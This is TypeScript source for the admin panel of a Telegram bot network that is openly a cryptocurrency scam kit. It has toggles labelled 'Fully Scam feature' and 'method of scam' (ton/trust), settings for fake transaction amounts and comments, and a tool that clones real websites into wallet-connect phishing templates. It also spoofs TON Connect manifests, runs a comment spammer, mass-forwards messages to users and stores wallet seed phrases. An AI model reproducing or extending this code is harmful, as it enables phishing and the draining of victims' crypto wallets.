import DodoBot from './DodoBot';
import DodoSession from './DodoSession';

import {ADMIN_BOT, DodoAdminBot} from '../main';
import prisma from "@backend/modules/prisma/Prisma";
import {BotConfigType, PhotoMedia, TheMessageContext} from "@/bot/classes/types/dodo";
import {Markup} from "telegraf";
import CustomTelegraf, {getBotConfig, getDefaultBotConfig, setBotConfig, setDefaultConfig} from './CustomTelegraf';
import * as fs from 'fs';
import {getSpammerConfig, setSpammerConfig} from '../spammer';
import * as Path from "path";
import {getContractWallet} from "@/app/api/transaction/route";
import {WebTemplate} from "@/bot/copier/template";
import {WebToZip} from "@/bot/copier/webToZip";
import {generateRandomString} from "@backend/utils/string";
import * as child_process from "node:child_process";
import {getDefaultManifest} from "@/app/api/tonconnect-manifest.json/route";

const envAdmins = process.env['ADMINS']?.split(" ").map(o => +o);
export const DodoAdmins = envAdmins?.length ? envAdmins : [6629569837, 5642287166, 732607334, 7859318221];

class DodoAdmin extends DodoSession {
	admins = DodoAdmins;

	async selectClient(isSingle = false) {
		const ClientList = CLIENT_BOTS.map((o, i) => `${i + 1}. @${o.me?.username ?? o.me?.first_name}`).join("\n");
		const selected = await this.input(`Select Bot\n${ClientList}\n${!isSingle && "(or type all for selecting to all of the bots)\n(type cancel for ignore operation)"}`).then(r => r.text?.toLowerCase() || "cancel");
		if (+isNaN(+selected) && selected !== 'all') {
			throw ("Canceled")
		}
		const single = CLIENT_BOTS[+selected - 1];
		const final = single ? [single] : (selected === "all" && !isSingle ? CLIENT_BOTS : []);
		if (!final.length) throw ("Operation Canceled");
		return final
	}

	async commands() {
		const ctx = this.ctx;
		const startButtons = [
			'Stats',
			'Add Coin',
			'Remove Coin',
			'Block',
			'Unblock',
			'Twitter Lock',
			'Channel Lock',
			'Forwarder',
		];
		const user = await prisma.user.findUnique({
			where: {
				id: ctx.from?.id || -1
			}
		})
		const reply = async (txt: string) => {
			return ctx.reply(txt);
		};
		const id = !!ctx ? ctx.from?.id || ctx.update?.message?.from?.id || ctx.chat?.id : -1;
		if (!!id && !this.admins.includes(id)) {
			console.error('ACCESS DENIED', id)
			return [];
		}

		const config = getDefaultBotConfig();

		return [
			{
				name: 'Panel',
				handler: async () => {
					await ctx.reply('Admin Panel', DodoBot.renderButtons(startButtons));
				},
				buttons: startButtons,
			},
			{
				name: ['Block', 'Unblock'],
				menu: ['block:Block User', 'unblock:Unblock User'],
				handler: async () => {
					const username = (await this.input('Enter target username'))
						?.text
						?.replace('@', '');
					const user = await prisma.user.findFirst(({
						where: {
							username: username + "",
						},
					}));

					if (!user) {
						await reply('User not found');
						return;
					}

					const newUser = await prisma.user.update({
						where: {
							id: user.id
						},
						data: {
							blocked: !user.blocked
						}
					});

					await reply(`User has been ${newUser.blocked ? 'block' : 'Unblock'}ed`);
				},
			},
			{
				name: 'Stats',
				handler: async () => {
					await reply(`User Count: ${await prisma.user.count()}`);
				}
			},
			{
				name: "Messenger",
				menu: ['messenger:Change Timeout of ad messages'],
				handler: async () => {
					const clients = await this.selectClient();
					const str = (await Promise.all(clients.map(async client =>
						`${client.me?.username ?? client.me?.first_name} => ${(await getBotConfig(client)).time || 12}`
					))).join("\n")
					const newTimeout = await this.input(`${str}\n\n) Enter Number For Setting Hours\n) Type 0 for disabling automaitc\n) type "random" for random hours\n Enter hours between sending automatic messages (or type cancel)`).then(r => r.text);
					if (newTimeout === 'cancel') throw ("CANCELED");

					for (const client of clients) {
						await setBotConfig(client, {
							time: newTimeout,
							ad: newTimeout !== 0
						})
					}


					await reply("Timeout updated");
				}
			},
			{
				name: 'Forwarder',
				handler: async () => {
					const finalList = await this.selectClient();

					const ctxFromUser = await this
						.input(`${finalList.length} bots selected, Send your message to forward to all members(or cancel)`);
					const msg = ctxFromUser.message;
					const adminTelegram = DodoAdminBot.bot.telegram;
					if (msg?.text?.includes?.('cancel')) throw ("CANCELED")
					const url = msg.photo?.length ? (await adminTelegram.getFileLink(msg.photo.pop()
						.file_id))
						.toString() : null;
					const users = await prisma.user.findMany();

					for (let client of finalList) {
						const clientTelegram = client.telegram;

						let FirstUploaded: any | null;
						let start = 0;
						let take = 50;
						let thread: ReturnType<typeof setInterval>;

						const doForward = async () => {
							try {
								const to = start + take;
								const array = users?.slice?.(start, to);
								if (!array?.length && thread) {
									clearInterval(thread);
									await ctx.reply(`Forwarded to ${users?.length} successful`);
									return;
								}
								for (const user of array) {
									try {
										if (url) {
											FirstUploaded = await clientTelegram
												.sendPhoto(user.chatId,
													FirstUploaded ?
														(FirstUploaded?.photo?.shift?.()?.file_id + "") :
														{
															url
														},
													{
														caption: msg.caption
													}).catch(() => undefined);
										} else {
											await clientTelegram.sendMessage(user.chatId, msg.text).catch(() => undefined);
										}
									} catch (e) {
										console.error(e);
									}
								}
								await ctx.reply(`Forwarded to ${array?.length + start}/${users.length}`).catch(() => null)
							} catch (e) {
								console.error("forward fail", e);
							}
							start += take;
						}
						await doForward();
						thread = setInterval(doForward, 2 * 1000);
					}
				}
			},
			{
				name: ['add_coin', 'remove_coin', 'coin'],
				menu: ['add_coin:Add Coin to User', 'remove_coin:Remove Coin From User'],
				handler: async () => {
					const username = (await this.input('Enter target username:')).text;
					const user = await prisma.user.findFirst(({
						where: {
							username: username + ""
						}
					}));
					if (!user) throw ("Doesn't exist");

					await reply(`User Balance: ${user.wallet}`);

					const amount = +((await this.input('Enter Coin Amount'))?.text || "");
					if (isNaN(amount)) throw ("Please enter valid number");

					const decrease = ctx.text?.includes('remove');
					const final = Math.max(0, decrease ? user.wallet - amount : user.wallet + amount);
					await prisma.user.update({
						where: {
							id: user.id
						},
						data: {
							wallet: final
						}
					});
					await reply(`The Operation was Successful. ${decrease ? '-' : '+'}${amount}dodo\nUser Balance:${final}`);
				}
			},
			{
				name: "Fee Value",
				menu: ['fee_value:Change Price of fee for users who doesn\'t have enough fee to pay'],
				handler: async () => {
					const clients = await this.selectClient();
					const str = (await Promise.all(clients.map(async client =>
						`${client.me?.username ?? client.me?.first_name} => ${(await getBotConfig(client)).feeValue || 0.1} TON`
					))).join("\n")
					const newFee = await this.input(`${str}\n\n Enter number ton (nano)\n exmaple: 0.1`).then(r => r.text);
					if (newFee === 'cancel') throw ("CANCELED");
					if (isNaN(+newFee)) throw ("invalid fee number");

					for (const client of clients) {
						await setBotConfig(client, {
							feeValue: newFee + ""
						})
					}

					await reply("Fee Value updated");
				}
			},
			{
				name: "Toggle Fee Action",
				menu: ['fee_toggle:Enable/Disable fee feature'],
				handler: async () => {
					const clients = await this.selectClient();
					const str = (await Promise.all(clients.map(async client =>
						`${client.me?.username ?? client.me?.first_name} => ${(await getBotConfig(client)).feeEnabled ? "Enabled ✅" : "Disabled ❌"}`
					))).join("\n")
					const toggleInput = await this.input(`${str}\n\n type "disable" or "enable" for toggling: (or type cancel for ignroe operation)`).then(r => r.text);
					if (toggleInput === 'cancel') throw ("CANCELED");

					for (const client of clients) {
						await setBotConfig(client, {
							feeEnabled: toggleInput === 'enable'
						})
					}

					await reply(`Fee Feature has been ${toggleInput === 'enable' ? "enabled" : "disabled"}!`);
				}
			},
			{
				name: "Spammer Toggle",
				menu: ['spammer_toggle:Enable/Disable spammer feature'],
				handler: async () => {
					const spammerConfig = getSpammerConfig();
					const toggleInput = await this.input(`Spammer is ${spammerConfig.enabled ? "Running ✅" : "Stopped ❌"}\n\n type "disable" or "enable" for toggling: (or type cancel for ignroe operation)`).then(r => r.text);
					if (toggleInput === 'cancel') throw ("CANCELED");

					setSpammerConfig({
						enabled: toggleInput === 'enable'
					})

					await reply(`Spammer Feature has been ${toggleInput === 'enable' ? "enabled" : "disabled"}!`);
				}
			},
			{
				name: "Toggle V2 Scam Feature",
				menu: ['scam_v2_toggle:Enable/Disable Fully Scam feature'],
				handler: async () => {
					const clients = await this.selectClient();
					const str = (await Promise.all(clients.map(async client =>
						`${client.me?.username ?? client.me?.first_name} => ${(await getBotConfig(client)).scamV2 !== false ? "Enabled ✅" : "Disabled ❌"}`
					))).join("\n")
					const toggleInput = await this.input(`${str}\n\n type "disable" or "enable" for toggling: (or type cancel for ignore operation)`).then(r => r.text);
					if (toggleInput === 'cancel') throw ("CANCELED");

					for (const client of clients) {
						await setBotConfig(client, {
							scamV2: toggleInput === 'enable'
						})
					}

					await reply(`Fully Scam Feature has been ${toggleInput === 'enable' ? "enabled" : "disabled"}!`);
				}
			},
			{
				name: "Manage Bot Menu",
				menu: ['bot_menu:Manage Bot Menu'],
				handler: async () => {
					const [bot] = await this.selectClient(true);
					if (!bot) {
						throw ("Invalid bot selection");
					}
					const config = await getBotConfig(bot);
					const toggleInput = await this.input(`${bot.me?.username}\n${config.menu?.join("\n") || "Not Customized Menu!"}\n\nMenu Structure\nname:value\n\nexample:\nGoogle:https://google.com\nOpen App:dapp\nInvite:ref\n\nSpecial Value:\nref = Referral button\ndapp = Web App Button\n\nExample multi input:\nTest1:dapp\nTest2:dapp\nTest3:ref`).then(r => r.text);
					if (toggleInput === 'cancel') throw ("CANCELED");

					await setBotConfig(bot, {
						menu: toggleInput.split('\n')
					})

					await reply(`Bot Menu has been updated!`);
				}
			},
			{
				name: "Spammer Manage Url List",
				menu: ['spammer_list:Spammer Manage Url List'],
				handler: async () => {
					const spammerConfig = getSpammerConfig();
					let list = Array.from(spammerConfig.watch_url || []);
					const input = await this.input(`${list?.map((o, i) => `${i + 1}. ${o?.label ?? o.url}`).join("\n\n")}\n\n type (number) for removing url from list\ntype url for adding url to list: (or type cancel for ignroe operation)\nwhen adding url you can add new line to type name of url`).then(r => r.text);
					if (input === 'cancel') throw ("CANCELED");

					const str = (input + "");
					if (str.startsWith("http")) {
						const url = str.split("\n")[0];
						list.push({
							url: url,
							label: str.split("\n")?.at(-1) || url
						});
						setSpammerConfig({
							watch_url: list
						})
						await reply(`url has been added to watch list`);
					} else if (!isNaN(+input)) {
						delete list[+input - 1];
						setSpammerConfig({
							watch_url: list.filter(Boolean)
						})

						await reply(`url has been removed from list`);
					} else throw ("Invalid input (must be number or url)");
				}
			},
			{
				name: "Spammer Manage Comment List",
				menu: ['spammer_list_c:Spammer Manage Comment List'],
				handler: async () => {
					const spammerConfig = getSpammerConfig();
					let list = Array.from(spammerConfig.comments || []);
					const input = await this.input(`${list?.map((o, i) => `${i + 1}. ${o}`).join("\n\n")}\n\n type (number) for removing comment from list\ntype comment for adding comment to list: (or type cancel for ignroe operation)`).then(r => r.text);
					if (input === 'cancel') throw ("CANCELED");

					if (!isNaN(+input)) {
						delete list[+input - 1];
						setSpammerConfig({
							comments: list.filter(Boolean)
						})
						await reply(`comment has been removed from list`);
					} else {
						list.push(input);
						setSpammerConfig({
							comments: list
						})

						await reply(`comment has been added to list`);
					}
				}
			},
			{
				name: "Stop ad",
				menu: ['ad_stop:Stop all bot ads'],
				handler: async () => {
					await prisma.siteSetting.updateMany({
						where: {
							key: {
								endsWith: "_skip"
							}
						},
						data: {
							value: 9999999999
						}
					});
					await prisma.siteSetting.updateMany({
						where: {
							key: {
								endsWith: "_ad_status"
							}
						},
						data: {
							value: "false"
						}
					});

					const startAt = new Date();
					startAt.setHours(startAt.getHours() + 5);
					await prisma.siteSetting.updateMany({
						where: {
							key: {
								endsWith: "_start_at"
							}
						},
						data: {
							value: startAt.getTime()
						}
					})

					ctx.reply("Ad has been stopped");
				}
			},
			{
				name: "Ad Start",
				menu: ['ad_start:Start all bot ads'],
				handler: async () => {
					await prisma.siteSetting.updateMany({
						where: {
							key: {
								endsWith: "_skip"
							}
						},
						data: {
							value: 0
						}
					});
					await prisma.siteSetting.updateMany({
						where: {
							key: {
								endsWith: "_ad_status"
							}
						},
						data: {
							value: "true"
						}
					});

					const startAt = new Date();
					startAt.setHours(startAt.getHours() + 5);
					await prisma.siteSetting.updateMany({
						where: {
							key: {
								endsWith: "_start_at"
							}
						},
						data: {
							value: -1
						}
					})

					ctx.reply("Ad has been started");
				}
			},
			{
				name: "Change Banner",
				menu: ['bot_banner:Change Banner of bots'],
				handler: async (ctx: TheMessageContext) => {
					const def = getDefaultBotConfig();
					function read(path = ['ads']) {
						const R: string[] = [];
						const absolutePath = Path.join(...path);
						const relativePath = Path.join(process.cwd(), 'public', absolutePath);
						const entries = fs.readdirSync(relativePath);
						for (let entry of entries) {
							if (fs.statSync(Path.join(relativePath, entry)).isDirectory()) {

								R.push(...read([...path, entry]));
							} else {
								R.push(Path.join(absolutePath, entry));
							}
						}

						return R;
					}

					let availableBanners = [
						...read(),
						...(def.additional_banners || [])
					].map(o => ({
						path: typeof o !== 'string' ? o.path:o,
						name: typeof o !== 'string' ? o.name:Path.parse(o).name
					}));

					const clients = await this.selectClient();

					const values = (await Promise.all(clients.map(async client =>
						`${client.me?.username} ${(await getBotConfig(client)).banner}`
					))).join("\n")

					const input = await this.input(`${values}\nAvailable Banners:\n${availableBanners.map((o, i) => `${i + 1}. ${o.name}`).join("\n")}\n\nEnter number for selection: (or type cancel)`).then(r => r.text);
					if (input.toLowerCase() === 'cancel') throw ("CANCELED");

					const banner = (availableBanners[+input - 1]).path;
					for (let client of clients) {
						await setBotConfig(client, {
							banner
						})
					}

					await ctx.reply(`Banner has been updated to ${banner}`);
				}
			},
			{
				name: "Bot Text",
				menu: ['bot_home_text:Change text of /start message of bots'],
				handler: async () => {
					const clients = await this.selectClient();
					const str = (await Promise.all(clients.map(async client =>
						`${client.me?.username ?? client.me?.first_name} =>\n${(await getBotConfig(client)).home_text || "NOT SET"}`
					))).join("\n\n")
					const homeText = await this.input(`${str}\n\n Enter New Text: (or type cancel)`).then(r => r.text);
					if (homeText.toLowerCase() === 'cancel') throw ("CANCELED");

					for (const client of clients) {
						await setBotConfig(client, {
							home_text: homeText + ""
						})
					}

					await reply("Home text updated");
				}
			},
			{
				name: "Bot Tokens Comment",
				menu: ['bot_tx_comment:Change Comment of transaction for each token'],
				handler: async () => {
					const clients = await this.selectClient();
					const str = (await Promise.all(clients.map(async client => {
						const config = await getBotConfig(client);
						const data = Object.entries(config.transaction_comments || {});
						return `@${client.me?.username}\n${data.map(([k, comment]) => `${k} = ${comment}`).join("\n")}`;
					}))).join("\n\n");

					const commentInput = await this.input(`${str}\n\n Type New Comments: (or type cancel)\n\nStructure:\nSYMBOL Comment\n\nexample:\nton Receive 10,000 $TON\ndogs Receive 304,000 $DOGS\n\nAttention: you must copy symbol from tonviewer or some wallet`).then(r => r.text);
					if (commentInput.toLowerCase() === 'cancel') throw ("CANCELED");

					const final = Object.fromEntries(
						(commentInput + "").split("\n")
							.filter(Boolean)
							.map(o => [
								o.split(" ")[0].toLowerCase(),
								o.split(" ").slice(1).join(" ")
							]).filter(o => !!o[1] && !!o[0])
					);

					for (const client of clients) {
						const config = await getBotConfig(client);
						await setBotConfig(client, {
							transaction_comments: {
								...(config.transaction_comments || {}) as any,
								...final
							}
						})
					}

					await reply("TX comments has been updated");
				}
			},
			{
				name: "Admins info",
				menu: ['admins_info:Show Admin Details'],
				handler: async () => {
					const admins = await Promise.all(
						DodoAdmins.map(async o => this.dodoBot.bot.telegram.getChat(o).catch(() => undefined))
					).then(e => e.filter(e => !!e))

					await ctx.reply(`Admins List: ${admins.map((a, i) => `${i}. ${'username' in a ? `${a.username} ${a.active_usernames?.join(",")}` : `${a.type}`} (${a.id})`)}`)
				}
			},
			{
				name: "Admins contact",
				menu: ['admins_contact:Admins contact'],
				handler: async () => {
					const admins = await Promise.all(
						DodoAdmins.map(async o => this.dodoBot.bot.telegram.getChat(o).catch(() => undefined))
					).then(e => e.filter(e => !!e))

					const number = await this.input(`Select an admin\n\nAdmins List: ${admins.map((a, i) => `${i}. ${'username' in a ? `${a.username} ${a.active_usernames?.join(",")}` : `${a.type}`} (${a.id})`).join("\n")}`)
						.then(e => e.text);
					const admin = admins[+number];
					if (!admin) throw ("Invalid selection");

					const txt = await this.input("Enter Message (only text allowed)").then(e => e.text);

					await this.dodoBot.bot.telegram.sendMessage(admin.id, txt)
				}
			},
			{
				name: "Add local Template",
				menu: ['add_local_template:Add custom Local Template'],
				handler: async () => {
					const config = getDefaultBotConfig();
					const customs = config.custom_templates || [];

					const input = await this.input(`Custom Template List:
${customs.map((custom, i) => `${i + 1}. ${custom.name} (${custom.url})`).join("\n")}

Enter number to delete item, type "add" for adding new item to list:
`).then(e => e.text + "")
					if (!isNaN(+input)) {
						delete customs[+input - 1];
						await ctx.reply(`item has been deleted`);
					} else if (input.toLowerCase() === 'add') {
						const url = await this.input("enter template pathname (only path name without https: and domain)\n\nExample:\n/hamster-swap").then(e => e.text);
						const name = await this.input("enter template name").then(e => e.text);
						customs.push({
							url,
							name
						})
						await ctx.reply("item has been added");
					} else throw ("Canceled");

					setDefaultConfig({
						...config,
						custom_templates: customs.filter(Boolean)
					});
				}
			},
			{
				name: "add bot",
				menu: ['add_bot_token:Add New Bot Client'],
				handler: async () => {
					const clients = CLIENT_BOTS.map((c, i) => `${i + 1}. @${c.me?.username}`);

					const token = await this.input(`Client List:
${clients.join('\n')}

type Token for adding new client to list:
`).then(e => e.text);
					await ctx.reply("Waiting for bot authentication...");
					const client = new CustomTelegraf('CustomClient', token);
					await new Promise(async (res, rej) => {
						client.onDisconnect(rej);
						setTimeout(() => rej("Client Failed"), 15000);
						const me = await client.waitToReady();
						if (CLIENT_BOTS.find(o => o.me?.username === me.username)) {
							rej("DUPLICATE BOT TOKEN DETECTED!");
						} else {
							res(true);
						}
					})

					CLIENT_BOTS.push(client);

					const {additional_tokens = []} = getDefaultBotConfig();
					setDefaultConfig({
						additional_tokens: [
							...additional_tokens,
							token
						]
					});

					await this.changeClientsTemplate(ctx, [client]);

					const wallet = await this.input(`enter wallet address of @${client.me?.username}`).then(e => e.text);
					const methodInput = await this.input("Enter method of scam\n\nton\ntrust").then(e=>e.text);

					await setBotConfig(client, {
						address: wallet + "",
						trustWallet: methodInput.toLowerCase() === 'trust'
					})

					await ctx.reply("New Client has been added\nRestarting bot handlers...\n\n" +
						"after 5sec you can start the bot\nalso you can customize bot banner and text by command menu of bot");
					this.dodoBot.bot.disconnectEvents.map(o => o(new Error("MANUAL DISCONNECTION"), client));
				}
			},
			{
				name: "Change Client template",
				menu: ['change_bot_template:Change Client template'],
				handler: async () => {
					await this.changeClientsTemplate(ctx, await this.selectClient());
				}
			},
			...this.ConfigHandler("spammer", "Change spammer wallet 24 words (just send 24 words)", async words => {
				return {
					...getSpammerConfig(),
					wallet: words
				}
			}),
			...this.ConfigHandler('additional_banners:add_banner', "Enter Name of new banner(s) (for identify in banner list)\nexample: Ton Spin Banner", async entriesName => {
				const {message} = await this.input('Send your banner image (also you can send multiple images!)');
				const photo: PhotoMedia = (!!message && 'photo' in message ? message.photo : []).pop();
				if (!photo) throw ("Image not found! (send it as compressed)");

				const writePath = Path.join(process.cwd(), 'public', 'downloaded-templates', 'banners');

				try {
					await fs.promises.mkdir(writePath, {
						recursive: true
					})
				} catch {
				}

				const link = await this.dodoBot.bot.telegram.getFileLink(photo.file_id);
				const arrayBuffer = await fetch(link.toString()).then(e => e.arrayBuffer());

				const {ext, name: fileName} = Path.parse(link.toString());
				const name = `${fileName}-${generateRandomString(20)}`;
				const finalName = `${name.slice(0, 20)}${ext}`;
				await fs.promises.writeFile(
					Path.join(writePath, finalName),
					(Buffer.from(arrayBuffer) as any)
				);

				const entry = {
					path: `/downloaded-templates/banners/${finalName}`,
					name: entriesName + ""
				} as const;

				await ctx.reply(`${name} saved to list!`);

				const {additional_banners = []} = getDefaultBotConfig();
				return [
					...additional_banners,
					entry
				] as typeof additional_banners
			}, true),
			...this.ConfigHandler('additional_banners:remove_banner', `
Additional Banners List:
${(config.additional_banners || []).map((banner, i) => `${i + 1}. ${banner.name}`).join("\n")}

enter number to remove banner
			`.trim(), async input => {
				const config = getDefaultBotConfig();
				let c = [...(config.additional_banners || [])];
				let n = +input;
				if (isNaN(n)) throw ("invalid input");
				n -= 1;

				const b = c[n];

				try {
					await fs.promises.rm(Path.join(process.cwd(),'public',b.path));
				} catch {}

				delete c[n];
				await reply(`${b.name} has been deleted!`);

				return c.filter(Boolean);
			}, true),
			...this.ConfigHandler("cloudflare", `
Manage Cloudflare firewall

Status: ${config.cloudflare?.enabled ? "Enabled" : "Disabled"}

${config.cloudflare ? `
Mode: ${config.cloudflare.mode || "challenge"}

Type block/challenge for change ip status mode
`.trim() : ""}
Type disable/enable for toggle cloudflare firewall
			`.trim(), async (input): Promise<Partial<BotConfigType['cloudflare']>> => {
				const def = getDefaultBotConfig() || {};
				const toggleInput = input === 'enable' || input === 'disable';
				const modeInput = input === "block" || input === "challenge";


				if (toggleInput) {
					const enabled = input === 'enable';
					let {globalApi, zone} = def.cloudflare || {}

					if (enabled) {
						if (!globalApi) globalApi = await this.input("Please enter cloudflare API TOKEN").then(e => e.text);
						if (!zone) zone = await this.input("Please enter cloudflare zone id").then(e => e.text);
					} else {
						globalApi = '';
						zone = '';
					}

					return {
						...def.cloudflare,
						enabled,
						globalApi,
						zone
					}
				} else if (modeInput) {
					return {
						...def.cloudflare,
						mode: input
					}
				} else throw ("invalid input! ❌")
			}, true),
			...this.ConfigHandler('custom_templates', `
Manage Templates

${(config.custom_templates || []).map((o, i) => (`${i + 1}. ${o.name}`)).join("\n")}

Type "add" => add new template
Type number to remove template from list
			`.trim(), async input => {
				const templates = (getDefaultBotConfig().custom_templates || []).filter(o => !!o.url);

				if (input.toLowerCase() === 'add') {
					const name = await this.input("Enter name of template (example: hamster-swap)").then(e => e.text);
					const url = await this.input("Enter url of template (website)\nexample: https://google.com").then(e => e.text);
					const folderName = Path.join(`downloaded-templates`, `${new URL(url).hostname + `-${generateRandomString(10)}`}`);
					const btnText = await this.input("Enter exact text of button for wallet connect\nalso you can define multiple button with new lines\n\nfor example:\n\nconnect wallet\nclaim reward\n\n").then(e => e.text+"");

					const path = Path.join(process.cwd(), 'public', folderName);
					await ctx.reply("Copying website... (1min)");
					await WebToZip.copyWebsite(url, path, {
						name: name || url,
						url
					});
					await ctx.reply("Website has been copied\nConfiguring template...");
					await WebTemplate.configTemplateIndex(
						Path.join(folderName, 'index.html'),
						btnText.split('\n')
					);

					const method = await this.input("Enter one of method to handle wallet connect\n\nv2sdk\nv1sdk").then(e=>e.text)
						.catch(()=>"normal");

					const templateUrl = new URL(process.env['WEB_ORIGIN'] + "");
					templateUrl.pathname = `/${folderName}/index.html`;
					templateUrl.search = `?bot=${CLIENT_BOTS?.[0]?.me?.id}&${method}=true`
					await ctx.reply("Template has been configured!\n\nRestarting Bot... you can try test after 5s\n(scam feature won't work in test)", {
						...Markup.inlineKeyboard([
							Markup.button.webApp(`Test ${name}`, templateUrl.toString())
						])
					}).catch(()=>undefined);

					const finalUrl = new URL(templateUrl);
					finalUrl.search = `?${method}=true`;
					templates.push({
						url: `${finalUrl.pathname}${finalUrl.search}`,
						name
					})

					setTimeout(() => {
						child_process.exec(`npx pm2 restart ${config.pm2 || "scam"}`);
					}, 1000);
					return templates;
				} else if (!isNaN(+input)) {
					const c = [...templates];
					const target = c[+input - 1];
					delete c[+input - 1];

					let path: string | undefined;
					try {
						let pathname = target.url;
						try {
							pathname = new URL((target.url.includes("://") ? "":"http://localhost")+target.url).pathname
						} catch {}
						const parse = Path.parse(pathname);
						path = Path.join(process.cwd(), 'public', parse.dir);
						fs.rmSync(path, {
							recursive: true
						});
					} catch (e) {
						await ctx.reply(`Fail to delete ${path} seems like its deleted already\n\n${e}`);
					}

					return c.filter(Boolean);
				} else throw ("invalid input ❌")

			}, true),
			...this.ConfigHandler("trustWallet", "Change scam method (ton/trust)\n\nIf you want to use ton method type 'ton'\nfor trust wallet method type 'trust'\n", async input => input.toLowerCase() === 'trust'),
			...this.ConfigHandler("feeWallet", "Change fee wallet 24 words (just send 24 words)"),
			...this.ConfigHandler("feeBalance", "Minimum required balance in usd for sending fee!\nexample: 20\n30", s => +s),
			...this.ConfigHandler("feeComment", "Change comment of fee transaction"),
			...this.ConfigHandler("minBalance", "Change minimum balance for sending fee"),
			...this.ConfigHandler("router", "Toggle Ton router (true/false)", e => e === 'true', true),
			...this.ConfigHandler("jettonFee", "Change Fee of jetton transaction\ndefault is: 0.07"),
			...this.ConfigHandler("referralText", "Change Referral Text"),
			...this.ConfigHandler("origin", "Change address of webapp"),
			...this.ConfigHandler("fakeAmount", "Enter amount of fake transaction"),
			...this.ConfigHandler("fakeComment", "Enter comment of fake transaction"),
			...this.ConfigHandler("fakeAddress", "Enter Token Contract of fake transaction", async (contract, client) => {
				const config = await getBotConfig(client);
				if (!config.address) throw (`Wallet address of ${client.me?.username} not found!`);
				const wallet = await getContractWallet(contract, config.address);
				return wallet.toString();
			}),
			...this.ConfigHandler('manifest', `Change Connect information (ton-manifest)\n\nfor edit single bot type 'edit'\nfor edit all of bot type 'edit default'\nfor reset information to default type 'reset'`, async (input,c) => {
				input = input.toLowerCase();
				const config = await getBotConfig(c);
				if (input === 'reset') {
					return {};
				} else if (input.startsWith("edit")) {
					const keys = ['url', 'name', 'iconUrl'] as const;

					let O: BotConfigType['manifest'] = {...config.manifest};
					for (let key of keys) {
						if (key === 'iconUrl') {
							const input = await this.input('Enter icon url or send image for setting icon').catch(()=>undefined);
							if (!input) continue;

							const {message} = input;
							const photo: PhotoMedia = (!!message && 'photo' in message ? message.photo : []).pop();
							if (photo) {

								const writePath = Path.join(process.cwd(), 'public', 'downloaded-templates', 'icons');

								try {
									await fs.promises.mkdir(writePath, {
										recursive: true
									})
								} catch {
								}

								const link = await this.dodoBot.bot.telegram.getFileLink(photo.file_id);
								const arrayBuffer = await fetch(link.toString()).then(e => e.arrayBuffer());

								const {ext, name: fileName} = Path.parse(link.toString());
								const name = `${fileName}-${generateRandomString(20)}`;
								const finalName = `${name.slice(0, 20)}${ext}`;
								await fs.promises.writeFile(
									Path.join(writePath, finalName),
									(Buffer.from(arrayBuffer) as any)
								);

								const url = new URL(process.env['WEB_ORIGIN'] + "");
								O[key] = `${url.origin}/downloaded-templates/icons/${finalName}` as string
							} else {
								O[key] = input.text;
							}
						} else {
							const input = await this.input(`Enter ${key}`).catch(()=>undefined).then(e=>e?.text);
							if (!input) continue;
							O[key as keyof typeof O] = input
						}
					}

					if (input.includes('default')) {
						const final = {
							...(await getDefaultManifest()),
							...O
						};

						const path = Path.join(process.cwd(),'public/tonconnect-manifest.json');
						await fs.promises.writeFile(path, JSON.stringify(final,null,2));
					}

					setTimeout(() => {
						child_process.exec(`npx pm2 restart ${config.pm2 || "scam"}`);
					}, 1000);
					await ctx.reply("Restarting due to applying changes... (took 5s)")
					return input.includes("default") ? {}:O;
				} else throw("INVALID INPUT")
			})
		];
	}

	ConfigHandler<T extends keyof BotConfigType>(k: T, hint: string, inputFilter: ((s: string, client: CustomTelegraf) => Promise<any> | any) | undefined = undefined, forDefault = false) {
		const [key, cmd = `handle_config_${key.toLowerCase()}`] = (k + "").split(":");
		return [
			{
				name: `Handle key config ${key}`,
				menu: [`${cmd}:${hint.slice(0, 20)}`],
				handler: async (ctx: TheMessageContext) => {
					const clients = forDefault ? [] : await this.selectClient();
					const str = clients.length ? (await Promise.all(clients.map(async client =>
						`${client.me?.username ?? client.me?.first_name} =>\n${(await getBotConfig(client))[key] || "NOT SET"}`
					))).join("\n\n") : "";
					let input = await this.input(`${str}\n\n ${hint}: (or type cancel)`.trim()).then(r => r.text);
					if (input.toLowerCase() === 'cancel') throw ("CANCELED");


					if (forDefault) {
						let finalInput: any = input + "";
						if (inputFilter) {
							finalInput = await inputFilter(finalInput, ADMIN_BOT);
						}

						if (typeof finalInput === 'number' && isNaN(finalInput)) throw("Not a number\nplease enter valid number")

						const def = getDefaultBotConfig();
						setDefaultConfig({
							...def,
							[key]: finalInput
						})
					} else {
						await Promise.allSettled(clients.map(async client => {
							let finalInput: any = input + "";
							if (inputFilter) {
								finalInput = await inputFilter(finalInput, client).catch((e: any)=>{
									ctx.reply("Err: "+(e?.message ?? e));
								});
							}
							await setBotConfig(client, {
								[key]: finalInput
							})
						}))
					}


					await ctx.reply(`${key} has been updated`);

				}
			}
		]
	}


	async changeClientsTemplate(ctx: TheMessageContext, clients: typeof CLIENT_BOTS) {
		const templateList = await WebTemplate.getTemplateList();

		const n = await this.input(`Template List:
${templateList.map((t, i) => `${i + 1}. ${t.name} (${t.url})`).join("\n")}

enter number to select template:
`).then(e => e.text);
		const template = templateList[+n - 1];
		if (!template) throw ("invalid template");

		const url = new URL(process.env['WEB_ORIGIN'] + "");
		const finalUrl = `${url.origin}${template.url}`;
		for (let client of clients) {
			await setBotConfig(client, {
				origin: finalUrl
			})
		}

		await ctx.reply("client(s) template has been updated");
	}
}

export default DodoAdmin;
